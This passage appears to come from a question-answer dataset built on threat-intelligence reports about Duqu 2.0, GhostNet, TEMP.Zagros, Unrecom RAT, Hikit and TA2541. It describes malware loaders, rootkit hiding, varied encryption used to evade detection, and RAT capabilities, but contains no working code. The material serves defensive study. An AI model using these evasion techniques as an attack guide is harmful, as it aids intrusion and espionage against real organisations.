services to infect other computers in the LAN, attackers can also use the Task Scheduler to start \"msiexec.exe\" remotely. The usage of Task Scheduler during Duqu infections for lateral movement was also observed with the 2011 version and was described by  6Symantec in their technical analysis.\n\"msiexec.exe\" - Task Scheduler trace in the logs\nThe MSI files used in the attacks contain a malicious stub inside which serves as a loader. The stub loads the other malware resources right from the MSI file and decrypts them, before passing execution to the decrypted code in memory.\nMalicious stub with query to load the other resources from the MSI file highlighted.\nThe encryption algorithms used for these packages differ from case to case. It's important to point out that the attackers were careful enough to implement unique methods, encryption algorithms and names (such as file names) for each attack, as a method to escape detection from security products and limit the ability of an antivirus company to find other infections once one of them has been identified.\nSo far, we've seen the following encryption algorithms used by the attackers:\n\u2022 Camellia\n\u2022 AES\n\u2022 XTEA\n\u2022 RC4\n\u2022 Different multibyte XOR-based encryption\n6\nFor compression algorithms, we've seen the following:\n\u2022 LZJB\n\u2022 LZF\n\u2022 FastLZ\n\u2022 LZO\nIn essence, each compiled attack platform uses a unique combination of algorithms that make it very difficult to detect.\nThe attackers can deploy two types of packages to their victims:\n\u2022 \"Basic\", in-memory remote backdoor (~500K)\n\u2022 Fully featured, C&C-capable, in-memory espionage platform (18MB)\nThese have similar structures and look like the following:\nMalicious Duqu 2.0 MSI package.\nIn the screenshot above, one can see the loader (ActionDll: 17,920 bytes) and the main payload (ActionData0: 476,736 bytes). Upon execution, ActionDll is loaded and control is passed to its only export, StartAction.\nThe \"basic\" in-memory remote backdoor is pushed to computers inside the domain by the Domain Controller on a regular basis \u2013 almost like a worm infection. This gives the attackers an entry into most of the machines from the domain and if further access is needed, they can upload a more sophisticated MSI file that deploys tens of different plugins to harvest information.\nA thorough description of the malware loading mechanism from the \"basic\" remove backdoor MSI can be found below.\nMedium Headline: File properties\nThe MSI file has the following general properties:\n\u2022 Composite Document File V2 Document\n\u2022 Little Endian\n\u2022 OS: Windows, Version 6.1\n\u2022 Code page: 1252\n\u2022 Title: {7080A304-67F9-4363-BBEB-4CD7DB43E19D} (randomly generated GUIDs)\n\u2022 Subject: {7080A304-67F9-4363-BBEB-4CD7DB43E19D}\n\u2022 Author: {7080A304-67F9-4363-BBEB-4CD7DB43E19D}\n\u2022 Keywords: {7080A304-67F9-4363-BBEB-4CD7DB43E19D}\n\u2022 Comments: {7080A304-67F9-4363-BBEB-4CD7DB43E19D}\n\u2022 Template: Intel;1033\n\u2022 Last Saved By: {7080A304-67F9-4363-BBEB-4CD7DB43E19D}\n\u2022 Revision Number: {4ADA4205-2E5B-45B8-AAC2-D11CFD1B7266}\n\u2022 Number of Pages: 100\n\u2022 Number of Words: 8\n\u2022 Name of Creating Application: Windows Installer XML (3.0.5419.0)\n\u2022 Security: 4\nIt should be noted that MSI files used in other attacks can have different other properties. For example, we observed several other fields:\n\u2022 Vendor: Microsoft or InstallShield\n\u2022 Version: 1.0.0.0 or 1.1.2.0 or 2.0.0.0\nSome of these are visible via the Windows Explorer file properties dialog box:\nThere are two binary blocks inside this MSI package:\nThe first binary, called ActionDll, is in fact a Windows PE DLL file, while the other one is a Camellia-encrypted and LZJB-compressed data payload (the encryption and compression algorithm vary from case to case). In fact, there are several layers of executable code embedded one into another as compressed or encrypted binary blocks. Here's a look at a Duqu 2.0 MSI package, with all its internal payloads:\nWe describe these components in more detail below.\nMedium Headline: First Layer: ActionDLL (msi.dll)\nOriginal filename: msi.dll\nMD5: e8eaec1f021a564b82b824af1dbe6c4d\nSize: 17'920 bytes\nLink time: 2004.02.12 02:04:50 (GMT)\nType: 64-bit PE32+ executable DLL for MS Windows\nThis DLL has only one export name called StartAction, which is called in the context of msiexec.exe process. When this function is called, it retrieves an MSI property called PROP and uses it as a decryption key for the bundled ActionData0 package:\nNext, the code iterates over 12 possible payloads that have to be decrypted and started. The payloads are part of the MSI and may have the following names: ActionData0, ActionData1, ActionData2, etc.\nThe package described here contains only one payload named \"ActionData0\".\nMedium Headline: Second Layer: ActionData0\nThis binary chunk contains the main code, in compressed and encrypted format. It represents a composition of executable, position-independent code blocks mixed with embedded data objects. The code seems to be based on a framework and heavily uses helper structures that contain pointers to a set of system APIs and offsets to internal data blocks. Such structures are definitely a trademark of the developer. When they are initialized, one field (usually the first 4 bytes) contains a magic value that identifies the state and type of the structure.\nAnother trademark of the coder is the way to import system API by module and export name hashes. The hashing algorithm was found all over this and other layers of executable code. It's easily recognizable by two DWORD constants: 0x8A20C27 and 0x67F84FC6.\nBasically, the code in ActionData0 passes execution to an embedded executable, which we will refer by its internal name: \"klif.dll\". The execution is passed to the second exported function in table of exports of this DLL file. This disregards the export name and relies only on the order of functions in the table of PE export ordinals. When this export function is called, a next stage helper structure pointer is passed to it, so that it can use some of the values set on the upper layer.\nHowever, before passing execution to klif.dll, the code attempts alternative routes. First, it attempts to find the name of the following format \"api-ms-win-shell-XXXX. dll\", where \"X\" can be any decimal number. The name is valid if there is no module with such filename loaded into current process. The code attempts to iteratively find such name starting from api-ms-win-shell-0000.dll, api-ms-win-shell-0001.dll, api-ms-win-shell-0002.dll and so on. This may be a dependency to the Duqu platform component that is yet to be discovered.\nRight after this, if the name was found, the code attempts to map a section kernel object by name, which is generated using a PRNG-based algorithm. The name of the section has the following template: \"\\BaseNamedObjects\\{XXXXXXXX-XXXX-XXXX-XXXXXXXXXXXX}\", where \"X\" is any hexadecimal digit that is generated based on current system boot time. So far, the name of the section is \"machine/boot time\" dependent, which makes it unique but allows other processes of modules to locate such section if they use the same name generation algorithm. This section is accessed in different other parts of the code and modules. Lets refer to this section as OSBoot-section from now. Once the section name is generated the code tries to open such section and, if it is found, it takes some values from it and attempts to open a specific device and issue a number of IOCTL codes to the driver. The name of the driver device as well as IOCTL codes are located inside a section of the kernel mode driver KMART.dll that is described below.\nThe code developer has a preference for using sections to any other ways to access data. Another use of sections appears to be in mapping the part of code/data where klif.dll is embedded and then finding that section using a hardcoded magic QWORD number: 0xA1B5F8FC0C2E1064. Once the section is found in address space of current process the code attempts to pass execution to it.  This alternative execution route is not applicable to current MSI file package but simply exists in the code probably due to common code template used for building current MSI package. It may also be an indicator of another Duqu platform component that wasn't used in the attacks that we observed.\n\nAnswer this question based on the above context: How did the Duqu 2.0 attackers ensure that their malware remained undetected and difficult to analyze? Discuss the methods they employed.",
    "output": "The Duqu 2.0 attackers ensured their malware remained undetected by implementing unique methods, encryption algorithms, and names for each attack. They used various encryption algorithms like Camellia, AES, XTEA, RC4, and different multibyte XOR-based encryption, along with compression algorithms such as LZJB, LZF, FastLZ, and LZO. Each compiled attack platform used a unique combination of these algorithms, making it very difficult to detect. Additionally, the attackers were careful to use different file names and properties for each attack, limiting the ability of antivirus companies to find other infections once one was identified.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Foreword\nCyber espionage is an issue whose time has come. In this second report from the Information Warfare Monitor, we lay out the findings of a 10-month investigation of alleged Chinese cyber spying against Tibetan institutions.\nThe investigation, consisting of fieldwork, technical scouting, and laboratory analysis, discovered a lot more.\nThe investigation ultimately uncovered a network of over 1,295 infected hosts in 103 countries. Up to 30% of the infected hosts are considered high-value targets and include computers located at ministries of foreign affairs, embassies, international organizations, news media, and NGOs. The Tibetan computer systems we manually investigated, and from which our investigations began, were conclusively compromised by multiple infections that gave attackers unprecedented access to potentially sensitive information.\nBut the study clearly raises more questions than it answers.\nFrom the evidence at hand, it is not clear whether the attacker(s) really knew what they had penetrated, or if the information was ever exploited for commercial or intelligence value.\nSome may conclude that what we lay out here points definitively to China as the culprit.  Certainly Chinese cyber-espionage is a major global concern. Chinese authorities have made it clear that they consider cyberspace a strategic domain, one which helps redress the military imbalance between China and the rest of the world (particularly the United States). They have correctly identified cyberspace as the strategic fulcrum upon which U.S. military and economic dominance depends.\nBut attributing all Chinese malware to deliberate or targeted intelligence gathering operations by the Chinese state is wrong and misleading. Numbers can tell a different story. China is presently the world's largest Internet population. The sheer number of young digital natives online can more than account for the increase in Chinese malware. With more creative people using computers, it's expected that China (and Chinese individuals) will account for a larger proportion of cybercrime.\nLikewise, the threshold for engaging in cyber espionage is falling. Cybercrime kits are now available online, and their use is clearly on the rise, in some cases by organized crime and other private actors. Socially engineered malware is the most common and potent; it introduces Trojans onto a system, and then exploits social contacts and files to propagate infections further.\nFurthermore, the Internet was never built with security in mind. As institutions ranging from governments through to businesses and individuals depend on 24-hour Internet connectivity, the opportunities for exploiting these systems increases.\nThis report serves as a wake-up call. At the very least, a large percentage of high-value targets compromised by this network demonstrate the relative ease with which a technically unsophisticated approach can quickly be harnessed to create a very effective spynet\u2026These are major disruptive capabilities that the professional information security community, as well as policymakers, need to come to terms with rapidly.\nThese are major disruptive capabilities that the professional information security community, as well as policymakers, need to come to terms with rapidly.\nRon Deibert, Director, the Citizen Lab, Munk Centre for International Studies, University of Toronto.\nRafal Rohozinski, Principal and CEO,\nThe SecDev Group,\nOttawa, Canada.\nBig Headline: Acknowledgements\nThis investigation was prepared by a dedicated team of professionals.\nGreg Walton conducted and coordinated the primary field-based research in India, Tibetan Missions abroad, and Europe. Greg is a SecDev Group associate and editor of the Information Warfare Monitor website. He is currently a SecDev Fellow at the Citizen Lab. The Indian portion of the field work  benefited from the expertise of Dr. Shishir Nagaraja, Security Laboratory, Cambridge University. Dr. Nagaraga visited Dharamsala for a period of five days in September to assist on aspects of the technical data collection.1\nThe technical scouting and computer network interrogation was carried out by Nart Villenueve. Nart is the CTO of Psiphon Inc, and the Psiphon Fellow at the Citizen Lab. His investigations included the discovery and exploration of the GhostNet control servers. He led the data analysis research, which included log files gathered in the field, as well as data obtained through technical scouting of the  GhostNet control servers.\nThis report represents a collective effort. The drafting team consisted of the following individuals (listed in alphabetical order). Ronald Deibert (Citizen Lab), Arnav Manchanda (SecDev Group), Rafal Rohozinski (SecDev Group and Psiphon Inc.), Nart Villeneuve (Psiphon Fellow, Citizen Lab) and Greg Walton (SecDev Fellow, Citizen Lab). Layout and design was led by Jane Gowan (Psiphon Inc. and Citizen Lab). Belinda Bruce (Blurb Media) and James Tay (Citizen Lab), provided additional support to the team.\nCountless others also contributed to the research effort. This includes individuals in India and Tibet, who for security reasons we cannot name. We are also grateful to the Private Office of his Holiness the Dalai Lama, the Tibetan Government-in-Exile, the missions of Tibet in London, Brussels, and New York, and Drewla (a Tibetan NGO).\n1 Aspects of the research carried out by Dr. Nagaraga  focusing on socially engineered malware are published in a separate study. See, The snooping dragon: social-malware surveillance of the Tibetan movement, Shishir Nagaraja, Ross Anderson, Cambridge University Computer Laboratory Technical Report, Mar 29 2009\nSummary p. 5\nIntroduction p. 7\nRise of the cyber spies p. 7\nA focus on China p. 9\nOutline of Report p. 9\nMedium Headline: Part Two: Tracking Ghostnet p. 16\nPhase I: Field investigation p. 17\n\u2022 Targeted malware \u2013 previous research p. 17\n\u2022 Information Warfare Monitor field research p. 22\n\u2022 Office of His Holiness the Dalai Lama p. 22\n\u2022 Tibetan Government-in-Exile p. 27\n\u2022 Offices of Tibet p. 27\n\u2022 Drewla p. 27\nPhase 2: Identifying command and control servers p. 30\n\u2022 List of infected computers p. 32\n\u2022 Sending commands p. 34\n\u2022 Command results p. 37\n\u2022 Methods and capabilities p. 39\n\u2022 Analysis of list of infected computers p. 40\n\u2022 Methodology p. 40 \u2022\t Selected infections p. 42\n\u2022 Infection timeline p. 44\nMedium Headline: Figures\nFig. 1: A \"Social Engineering\" attack connects to GhostNet p. 19\nFig. 2: A \"Socially Engineered\" email sent to the International Tibet Support Network p. 20\nFig. 3: A Virus Total Screen Capture of a malware infected email attachment p. 21\nFig. 4: Field researchers discovered malware at five Tibetan locations p. 23\nFig. 5: Malware retrieving a sensitive document p. 26\nFig. 6: The OHHDL and Drewla were infected by the same malware p. 29\nFig. 7: The GhostNet control servers p. 31\nFig. 8: The GhostNet \"Server List\" interface p. 33\nFig. 9: The GhostNet \"Send Command\" interface p. 35\nFig. 10: The gh0st RAT interface p. 36\nFig. 11: The GhostNet \"List Command\" interface p. 38\nFig. 12: The geographic location of infected hosts p. 41\nFig. 13. GhostNet infection timeline p. 45\nQ: How did the GhostNet investigation reveal the extent of cyber espionage activities? What methods were employed to uncover the network of infected hosts, and how did the attackers gain access to potentially sensitive information?",
    "output": "The GhostNet investigation revealed the extent of cyber espionage activities through a combination of fieldwork, technical scouting, and laboratory analysis. The investigation discovered a network of over 1,295 infected hosts in 103 countries, with up to 30% of these hosts being high-value targets such as ministries of foreign affairs, embassies, international organizations, news media, and NGOs. The attackers gained access to potentially sensitive information by compromising Tibetan computer systems with multiple infections, providing them with unprecedented access.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Outlook and Implications\nThe use of the Telegram API for command and control allows for malicious traffic to blend in with legitimate user behavior. Combined with the use of legitimate remote access software, publicly available tools such as LIGOLO and CrackMapExec, and the multi-layer encoding routine, Mandiant believes this reflects TEMP.Zagros' efforts to evade detection and security features. Meanwhile, it is unclear how the U.S. government's recent public attribution of \"MuddyWater\" to the Iranian Ministry of Intelligence and Security will affect the group's operations. It is plausible the group may re-tool and shift their tactics, techniques, and procedures prior to conducting additional operations.\nQuestion: Why did TEMP.Zagros utilize the Telegram API for command and control, and what other methods did they employ to evade detection? How might the recent attribution of 'MuddyWater' to the Iranian Ministry of Intelligence and Security impact their future operations?",
    "output": "Answer: TEMP.Zagros utilized the Telegram API for command and control to blend malicious traffic with legitimate user behavior, making it harder to detect. Additionally, they employed legitimate remote access software and publicly available tools such as LIGOLO and CrackMapExec, along with a multi-layer encoding routine, to further evade detection and security features. The recent attribution of 'MuddyWater' to the Iranian Ministry of Intelligence and Security by the U.S. government could potentially lead the group to re-tool and shift their tactics, techniques, and procedures before conducting additional operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Executive Summary\nIn the past two weeks, we have observed an increase in attack activity against the U.S. state and local government, technology, advisory services, health, and financial sectors through phishing emails with what appears to be a remote access trojan (RAT) known as Unrecom. The attack has also been observed against the financial sector in Saudi Arabia and Russia.\nAs Unrecom1 is a comprehensive multi-platform Java-based remote access tool, currently not detected by most AntiVirus products, it presents a risk to a large number of potential victims, regardless of operating system. The following is a screenshot of the Unrecom RAT v.2.0 (Version in Spanish):\nOver time, various reports in the community have documented the evolution of this tool. This evolution is to be expected, but its low detection rate, recent use this month through phishing emails campaigns against multiple sectors in the U.S. and association with past campaigns involving a variety of RATs captured our attention. The evolution of Unrecom RAT dates from its beginnings as a tool known as Frutas RAT, subsequently branded as Adwind RAT, and now Unrecom RAT.\nIn 2013, it was reported that Frutas RAT was used in phishing email campaigns against high profile companies in Europe and Asia in sectors such as finance, mining, telecom, and government2.\nUsers are granted permission to copy and/or distribute this document in its original electronic form and print copies for personal use. This document cannot be modified or converted to any other electronic or machine-readable form in whole or in part without prior written approval of Fidelis Security Systems, Inc.\nWhile we have done our best to ensure that the material found in this document is accurate, Fidelis Security Systems, Inc. makes no guarantee that the information contained herein is error free.\nPage 1 of 16 RAT in a jar: A phishing campaign using Unrecom\nUnrecom RAT provides the attacker with full control over the compromised system, once infected. It has some of the following capabilities:\n- Collection of System Information (e.g. IP, OS version, memory RAM information, Java version, Computer Name, User account compromised, etc.)\n- Upload & Execute additional malware, typically exploiting vulnerabilities derived from collected system information\n- Capture Webcam and Microphone, without user notification\n- Remote Desktop to watch user activity\n- File Manager allowing access to files in the context of the current user\n- Browser Password theft\n- Keylogging to capture passwords otherwise obscured from viewing\nIn the past, variants of the DarkComet and AcromRAT malware have also been observed beaconing to the same Command & Control (CnC) servers used by the Unrecom RAT in this campaign.\nThis document will provide information about the recent phishing campaigns observed with this RAT and some of the network indicators.\nBig Headline: Risk Assessment\nA remote access tool provides an attacker with full control over the victim system. Once a system has been compromised, the attacker may install one or more backdoors. These backdoors provide a persistent foothold, using a separate command and control channel; allowing future access less likely to be correlated to the original activity.\nThrough its modular plugin framework, this particular tool lets the attacker obtain System Information (e.g. IP, OS version, memory RAM information, Java version, Computer Name, User account compromised, etc.), Upload & Execute additional malware, Capture Webcam, Remote Desktop, File Manager, Browser Password Recovery, Capture Microphone, Keylogger, etc.\nBig Headline: Further Analysis And Correlation\nOne simple example of how the emails in this phishing campaign are related is that the Command and Control node (184.22.201[.]27) that the malware communicates with is shared by two separate phishing emails in this campaign, as shown in the diagram below.\nBeginning at the top of the diagram and working down, on the left side of the diagram are two phishing emails, the details of which are referenced in the pages above as item numbers 2 & 3. Of note, these phishing emails were sent to users at two separate and unrelated organizations. As you can see, when compared to each other, these messages appear completely unrelated, other than the fact they both contain jar files that are sophomorically \"obfuscated\" as pdf.jar files.\nNote that both the subjects, \"Transfer investigation report\" and \"Confirm transactions before release\" are comparatively unique as are the senders , \"Police Department\" cmmds@sbt.co[.]in and Arthur Anderson alexanderharolds@arthurandersen[.]com.  In addition to the fact that the emails share no attributes, the malicious attachments are also unrelated.\nFinally, and of most interest in this diagram, the central node at the bottom of the diagram, represents the Command and Control node (184.22.201[.]27) used by these two examples.  While this shared resource is noteworthy, of particular interest is that it has also been used in other campaigns.\nOn the right side of the diagram are files used in two other campaigns using the ArcomRAT8 and DarkComet6,7, The fact that they share the same command-and-control infrastructure as the UnrecomRat campaign make this central node all the more interesting.\nBig Headline: The Fidelis Take\nThis paper seeks to highlight this campaign targeting significant enterprises worldwide, utilizing a Java-based RAT malware that is currently detected by a small set of security tools. We are publishing these indicators so that others in the security research community can monitor for this activity and potentially correlate against other campaigns and tools that are being investigated.\nFidelis XPS\u2122, the Advanced Threat Defense solution from General Dynamics Fidelis Cybersecurity Solutions detects all of the activity documented in this paper. The Fidelis Threat Research Team will continue to follow this specific activity and actively monitor the ever-evolving threat landscape for the latest threats to our customers' security.\nBig Headline: References\n1. Adwind RAT Rebranding, Nov 2013: http://www.crowdstrike.com/blog/adwind-rat-rebranding/index.html\n2. Targeted Attacks Delivering Fruit, Aug 2013: http://www.symantec.com/connect/blogs/targeted-attacks-delivering-fruit\n3. Remote Access Tool Takes Aim with Android APK Binder, Jul 2013: http://www.symantec.com/connect/blogs/remote-access-tool-takes-aim-android-apk-binder\n4. Old Java RAT Updates, Includes Litecoin Plugin, Apr 2014: http://blog.trendmicro.com/trendlabs-security-intelligence/old-java-rat-updates-includes-litecoin-plugin/\n5. Cross-Platform Frutas RAT Builder and Back Door, Feb 2013: http://www.symantec.com/connect/blogs/cross-platform-frutas-rat-builder-and-back-door\n6. DarkComet Analysis \u2013 Understanding the Trojan used in Syrian Uprising, Mar 2012: http://resources.infosecinstitute.com/darkcomet-analysis-syria/\n7. DarkComet RAT - It is the END!, Jul 2012: http://www.symantec.com/connect/blogs/darkcomet-rat-it-end\n8. Tsunami Warning Leads to Arcom RAT, Nov 2012 http://blog.trendmicro.com/trendlabs-security-intelligence/tsunami-warning-leads-to-arcom-rat/\n\nBased on the above text, answer a question. How has the Unrecom RAT evolved over time, and what are some of its notable features that make it particularly dangerous?",
    "output": "The Unrecom RAT has evolved from its beginnings as Frutas RAT, subsequently branded as Adwind RAT, and now Unrecom RAT. Its notable features include the ability to collect system information, upload and execute additional malware, capture webcam and microphone data without user notification, provide remote desktop access, manage files, steal browser passwords, and keylog to capture passwords. These capabilities give the attacker full control over the compromised system.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: Gen 2 Driver\nThe Gen 2 sub-family, beginning with Gen 2.0 Beta, employs a Windows device driver (\"the Driver\") to hide aspects of the DLL's functionality from normal system processes. The Driver is a relatively straightforward piece of software. It does not attempt to obfuscate its functionality from static analysis and it hooks a minimum number of kernel API functions in order to hide different pieces of information. The Driver is based primarily on the open source Agony rootkit2 and it has evidence of some portions of the code coming directly from a Chinese blog3 .\nThe Driver expose an IOCTL interface that supports the following OIDs:\nThe Driver is capable of hiding processes (by PID, not name), system modules, services, network connections, listening ports, directories (and by extension, files), as well as registry keys and values. In order to hide these items, the Driver hooks various Windows Kernel API calls. The following table maps the items the Driver can hide to the API function that the Driver hooks:\n1 James Antognini and Thomas F. Divine. \"Extending\t\n  the\t\n  Microsoft PassThru NDIS\t\n  Intermediate\t\n  Driver\u2014Parts: Two IP\t\n  Address Blocking NDIS IM Drivers\". December 15, 2003\n2 pudn. \"Agony Rootkit code, the stability and\t\n  can\t\n  be useful Driver Develop\". http://en.pudn.com/downloads74/sourcecode/windows/vxd/detail265112_en.html.\t\n  8 April\t\n  2007.\n3 CardMagic. \"[Reserved] NSI Module Hook: Hiding Port Under Windows Vista\". http://forum.eviloctal.com/archiver/tid-\u00ad\u201029604.html.\t\n \u00a08 July 2007.\nIn order to hide services, the Driver will access the memory of the services.exe process, locate the linked list of services and remove the service entry that the Driver wishes to hide. This is a surprisingly invasive method to obfuscate a process.\nUpon activation, the Driver will expose its interface by calling IoCreateDevice with the name \\Device\\agony (for Gen 2.0 Beta samples), \\Device\\HTTPS (for Gen 2.1 samples),\n\\Device\\advcachemgr (for Gen 2.2 samples) or \\Device\\diskdump (for Gen 2.3 samples). The Driver also creates a symbolic link to the device using the same name but under the \\DosDevices\\ tree.\nFor reasons unknown, the authors of the Driver used code from a Chinese blog that details how to hide network connections on Windows Vista and later decided to keep the example IP address within the code.\nMedium Headline: Command: connect\nThe connect function provides the functionality to allow one Hikit DLL to interface with another DLL of a similar version. The use of this functionality can best be illustrated by considering the fact that the Gen 1 Driver requires an exposed network interface in order for an external attacker to access the Gen 1's RAT function. This would prohibit lateral movement within a victim's network as the bulk of any organization's network infrastructure is not directly exposed to the Internet. By using the connect command, an attacker can instruct the externally exposed Gen 1 DLL to route traffic to a Gen 1 DLL that is behind the firewall, effectively making the externally exposed Gen 1 DLL a local router for Hikit traffic.\nMedium Headline: Gen 1 Analysis\nAs noted previously in this report, the Gen 1 sub-family has several sub-generations but overall the functionality of the Gen 1 sub-family has remained constant. With the exception of Gen 1.0, the functionality of Gen 1 comes from the DLL component (Gen 1.0 uses a stand-alone executable to achieve the same results). The DLL operates as a service, requiring an attacker is install the DLL as a service at some point prior to activation. The DLL contains only two exports: DllEntryPoint and DllRegisterServer.\t\n  Ultimately, both exports generate a new thread of the same function (\"mainThread\"). The difference between the two exports is that DllRegisterServer can take an optional command line argument of the letter \"u\" which will instruct the main thread to uninstall the Gen 1 system from a victim's computer. If the uninstall argument exists, mainThread will simply remove the Driver from the victim's machine and terminate. The authors of Gen 1 used freely available source code found online for their removal function.4\n4 PCAUSA. \"Programmatically Installing NDIS\t\n  Protocol Drivers\" http://www.ndis.com/ndis-\u00ad\u2010general/ndisinstall/programinstall.htm.\t\n \u00a02 December 2013.\nWhen the DLL activates, either by a call to DllEntryPoint or by calling DllRegisterServer without the u parameter, mainThread begins by verifying the version of the Driver installed on the victim's machine. This requires sending OID 0x12C850 to the Driver and comparing the resulting 32-bit value with the required driver version. If the version is incorrect (i.e. it doesn't match the specified version), the DLL installs the version of the Driver found within the DLL's resource section (under the BIN resource tree).\nWith the Driver version verified (or forcibly corrected by installing the appropriate Driver), the DLL will instruct the Driver to use a specified string (for Gen 1.0 and Gen 1.1 samples) or a DWORD (for Gen 1.2 samples) as the acknowledgment value to send to a connecting client who requests the appropriate URL. The DLL again checks the version of the Driver and, in some versions of the DLL, will print a message indicating the version of the Driver installed and report the \"Transate version\" (the word translate is misspelled within the binary). It appears that the Driver and the communication protocol version do not necessarily have to match exactly, allowing the possibility that the Driver and the DLL could be compiled at separate times. If the Driver version is less than the \"Transate\" version (indicating that the Driver is a version too old to support the necessary communication protocols), the DLL will, in some version of the DLL, print out a line to the screen indicating the DRIVER_MIN_VERSION required along with the current Driver version. Following this, the DLL will then attempt to install the correct version of the Driver prior to terminating. It is unclear why this code exists given that the DLL will check the Driver version and correct the Driver if necessary prior to reaching the portion of the code that reports the DRIVER_MIN_VERSION.\t\n  It is possible that the second Driver version check is a last ditch effort to ensure the correct Driver is installed.\nThe DLL enters an infinite loop where the DLL waits for the Driver to report a new channel exists. A channel represents an established connection between the Driver and an external party that has provided the proper initial request and, for Gen 1.2 variants, provided the proper authentication value. When the Driver establishes a new channel, the DLL generates a runtime data structure before generating a new thread (\"HikitThreadFunc\") which will service any request coming from the new channel. This allows the DLL to service multiple channels at one time.\nThe HikitThreadFunc function is, at its core, a simple wait and respond loop. The function begins by transmitting a Hikit command prompt to the client (Hikit>) before settling into an infinite loop of\n\u2022 Read data from channel (wait until data is available)\n\u2022 [For Gen 1.2] Decrypt the packet header\n\u2022 Verify the packet header to ensure the communication version is correct and the payload data size is non-zero\n\u2022 Read the remainder of the packet (e.g. the payload portion)\n\u2022 If the packet type field (dwPacketType) is zero, send the payload section to the command processor.\n\u2022 Send the Hikit prompt\nThe communication scheme between the DLL and the client consists of a 20 to 24 byte header (for Gen 1.0 and Gen 1.1) or a 28 byte header (for Gen 1.2) followed by an optional payload. The format of the Gen 1.0 and Gen 1.1 header is as follows:\nWhile the Gen 1.2 header is:\nstruct PacketHeader\n{\n};\nFor Gen 1.0 and Gen 1.1 samples, the magic field contains the string \".. ..\" (two dots followed by a space then two more dots). Whereas the key field in Gen 1.2 samples contains a 32-bit value that represents the XOR key for the remainder of the PacketHeader and any additional payload data. The XOR scheme works on 32-bit chunks of data where each 32-bit chunk of data is XOR'd against the key value.\nVersion checking is important in all Gen 1 variants. The dwHikitVersion field allows the client and the DLL to ensure that they have a compatible communication scheme in place prior to executing commands.\nGen 1 samples have a particular interest in the victim's locale language preferences. While it is typical for most RATs that provide remote shells to simply pass data unfiltered from client to server and server to client without regard to code pages, Gen 1 samples take special care to record the code page and locale information in each and every packet header that traverses the divide between client and server and server and client. This could indicate that the authors of Gen 1 understood from an early stage in the development of Gen 1 that they would be attacking computer systems with different locales and code pages.\nAnswer this question: Describe the initialization process of the Gen 1 DLL in the Hikit malware, including how it handles version verification and driver installation.",
    "output": "The Gen 1 DLL in the Hikit malware operates as a service and contains two exports: DllEntryPoint and DllRegisterServer. Both exports generate a new thread of the same function ('mainThread'). The difference is that DllRegisterServer can take an optional command line argument 'u' to uninstall the Gen 1 system. Upon activation, mainThread verifies the version of the Driver installed on the victim's machine by sending OID 0x12C850 to the Driver and comparing the resulting 32-bit value with the required driver version. If the version is incorrect, the DLL installs the correct version from its resource section. After verifying the Driver version, the DLL instructs the Driver to use a specified string or DWORD as the acknowledgment value for connecting clients. The DLL then enters an infinite loop waiting for the Driver to report a new channel, which represents an established connection.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Key Findings\nProofpoint researchers have tracked a persistent cybercrime threat actor targeting aviation, aerospace, transportation, manufacturing, and defense industries for years.\nThe threat actor consistently uses remote access trojans (RATs) that can be used to remotely control compromised machines.\nThe threat actor uses consistent themes related to aviation, transportation, and travel. The threat actor has used similar themes and targeting since 2017.\nProofpoint calls this actor TA2541.\nBig Headline: Campaign Details\nUnlike many cybercrime threat actors distributing commodity malware, TA2541 does not typically use current events, trending topics, or news items in its social engineering lures. In nearly all observed campaigns, TA2541 uses lure themes that include transportation related\nterms such as flight, aircraft, fuel, yacht, charter, etc.\nTA2541 demonstrates persistent and ongoing threat activity since January 2017. Typically, its malware campaigns include hundreds to thousands of messages, although it is rare to see TA2541 send more than 10,000 messages at one time. Campaigns impact hundreds of organizations globally, with recurring targets in North America, Europe, and the Middle East. Messages are nearly always in English.\nIn the spring of 2020, TA2541 briefly pivoted to adopting COVID-related lure themes consistent with their overall theme of cargo and flight details. For example, they distributed lures associated with cargo shipments of personal protective equipment (PPE) or COVID-19 testing kits.\nThe adoption of COVID-19 themes was brief, and the threat actor quickly returned to generic cargo, flight, charter, etc. themed lures.\nBig Headline: Delivery and Installation\nIn recent campaigns, Proofpoint observed this group using Google Drive URLs in emails that lead to an obfuscated Visual Basic Script (VBS) file. If executed, PowerShell pulls an executable from a text file hosted on various platforms such as Pastetext, Sharetext, and GitHub. The threat actor executes PowerShell into various Windows processes and queries Windows Management Instrumentation (WMI) for security products such as antivirus and firewall software, and attempts to disable built-in security protections. The threat actor will collect system information before downloading the RAT on the host.\nWhile TA2541 consistently uses Google Drive, and occasionally OneDrive, to host the malicious VBS files, beginning in late 2021, Proofpoint observed this group begin using DiscordApp URLs linking to a compressed file which led to either AgentTesla or Imminent Monitor. Discord is an increasingly popular content delivery network (CDN) used by threat actors.\nAlthough TA2541 typically uses URLs as part of the delivery, Proofpoint has also observed this actor leverage attachments in emails. For example, the threat actor may send compressed executables such as RAR attachments with an embedded executable containing URL to CDNs hosting the malware payload.\nListed below is an example of a VBS file used in a recent campaign leveraging the StrReverse function and PowerShell's RemoteSigned functionality. It is worth noting the VBS files are usually named to stay consistent with the overall email themes: fight, aircraft, fuel, yacht, charter, etc.\nBig Headline: Malware\nProofpoint has observed TA2541 using over a dozen different malware payloads since 2017. The threat actor uses commodity malware available for purchase on criminal forums or available in open-source repositories. Currently, TA2541 prefers AsyncRAT, but other popular RATs include NetWire, WSH RAT and Parallax.\nAll the malware used by TA2541 can be used for information gathering purposes and to gain remote control of an infected machine. At this time, Proofpoint does not know what the threat actor's ultimate goals and objectives are once it achieves initial compromise.\nWhile AsyncRAT is the current malware of choice, TA2541 has varied its malware use each year since 2017. The threat actor will typically use just one or a handful of RATs in observed campaigns, however in 2020, Proofpoint observed TA2541 distributing over 10 different types of malware, all using the same initial infection chain.\nBig Headline: Infrastructure\nTA2541 uses Virtual Private Servers as part of their email sending infrastructure and frequently uses Dynamic DNS (DDNS) for C2 infrastructure.\nThere are multiple patterns across the C2 infrastructure and the message artifacts. For example, historic campaigns have included the term \"kimjoy\" in the C2 domain name as well as in the threat actor reply-to address. Another striking TTP is the common pattern observed with TA2541 C2 domains and payload staging URLs containing the keywords \"kimjoy,\" \"h0pe,\" and \"grace\". TA2541 also regularly uses the same domain registrars including Netdorm and 